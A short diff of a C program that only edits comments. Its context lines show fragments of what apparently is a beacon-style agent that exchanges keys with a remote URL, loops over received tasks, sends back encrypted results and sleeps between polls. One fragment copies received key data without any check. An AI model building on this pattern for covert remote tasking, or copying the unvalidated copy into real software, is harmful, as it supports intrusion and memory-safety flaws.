@@ -1,4 +1,4 @@
-
+//!COMMENT try running it with out the task loop
 #include <stdio.h>
 #include <stdlib.h>
 #include <cstring>
@@ -32,7 +32,7 @@ int send_keymat(localKeys * km){
 
     post_request((char *)PP_KEY_URL, &b64_km);
 
-    //TODO take out here
+    //!COMMENT take this out and see what happens
     free(b64_km.memory);
     return SUCCESS;
 fail:
@@ -52,9 +52,8 @@ int recv_keymat(keyMat * km,localKeys *lk){
 
     sender_key.memory = base64_decode((const unsigned char *)b64_km.memory,(size_t)b64_km.size,(size_t*)&sender_key.size);
     
-    //copy their keymat into the km structure
-    //what should i be checking for here
-    //TODO
+    //!COMMENT copy their keymat into the km structure
+    //!COMMENT what should i be checking for here
     memcpy(km->sender_pub_key,sender_key.memory,KEY_LEN);
     
     //copy my private key
@@ -147,7 +146,8 @@ int send_result(keyMat * km, TaskBytes* tb){
     //encrypt it 
     enc(&eb, km, &db);
     DEBUG_PRINT("sequencing bytes");
-    
+
+    //!COMMENT this is embarrassing dont judge me
     offset = 80;
     eb_inline.size = eb.len + offset;
     eb_inline.memory = (uint8_t*) malloc(eb_inline.size);
@@ -245,7 +245,7 @@ int main()
                 send_result(&session,&response);
                 break;
         } 
-       
+
         
 next:
         DEBUG_PRINT("sleeping %d seconds\n",TIMEOUT);
